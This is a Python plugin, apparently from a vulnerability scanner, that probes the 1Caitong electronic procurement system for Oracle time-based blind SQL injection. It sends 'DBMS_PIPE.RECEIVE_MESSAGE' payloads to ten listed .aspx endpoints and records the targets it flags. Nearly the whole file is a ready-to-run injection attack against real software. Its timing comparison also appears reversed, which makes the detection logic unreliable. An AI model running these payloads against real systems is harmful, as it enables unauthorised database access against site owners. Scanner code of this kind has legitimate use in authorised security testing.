#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
注意！只能对oracle数据库起作用
'''
__author__ = 'Ascotbe'
__times__ = '2019/10/13 22:12 PM'
import urllib.parse
import requests
import re
import time
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-1-5"  # 插件编辑时间
        self.info['disclosure']='2015-09-06'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "OneCaitongElectronicProcurementSystemSQLInjection2"  # 插件名称
        self.info['name'] ='一采通电子采购系统SQL注入2' #漏洞名称
        self.info['affects'] = "1Caitong"  # 漏洞组件
        self.info['desc_content'] = "北京网达信联通用型电子采购系统多处SQL注入漏洞"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "暂无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,UnixTimestamp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    urls = ['/Plan/TitleShow/ApplyInfo.aspx?ApplyID=1',
                '/Price/AVL/AVLPriceTrends_SQU.aspx?classId=1',
                '/Price/SuggestList.aspx?priceid=1',
                '/PriceDetail/PriceComposition_Formula.aspx?indexNum=3&elementId=1',
                '/Products/Category/CategoryOption.aspx?option=IsStop&classId=1',
                '/Products/Tiens/CategoryStockView.aspx?id=1',
                '/custom/CompanyCGList.aspx?ComId=1',
                '/SuperMarket/InterestInfoDetail.aspx?ItemId=1',
                '/Orders/k3orderdetail.aspx?FINTERID=1',
                '/custom/GroupNewsList.aspx?child=true&groupId=121']
    payload1 = "%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,0)"
    payload2 = "%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,5)"
    for payload in urls:
        try:
            payload_url = scheme + "://" + url +":"+ str(port)+payload+payload1
            payload_url2 = scheme + "://" + url + ":" + str(port) + payload + payload2

            headers = {
                'User-Agent': RandomAgent,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }

            s = requests.session()
            time0 = time.time()
            resp = s.get(payload_url,headers=headers, timeout=6, verify=False)
            time1 = time.time()
            resp2 = s.get(payload_url2, headers=headers, timeout=6, verify=False)
            time2 = time.time()
            con = resp.text
            code = resp.status_code
            code2 = resp2.status_code
            if code2!=0 and code!=0 and ((time1-time0)-(time2-time1)) > 4:
                Medusa = "{}存在一采通电子采购系统SQL注入漏洞\r\n 验证数据:\r\n返回内容:{}\r\npayload:{}\r\n".format(url,con,payload_url)
                _t=VulnerabilityInfo(Medusa)
                ClassCongregation.VulnerabilityDetails(_t.info, url,UnixTimestamp).Write()  # 传入url和扫描到的数据
                ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
        except Exception:
            _ = VulnerabilityInfo('').info.get('algroup')
            _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名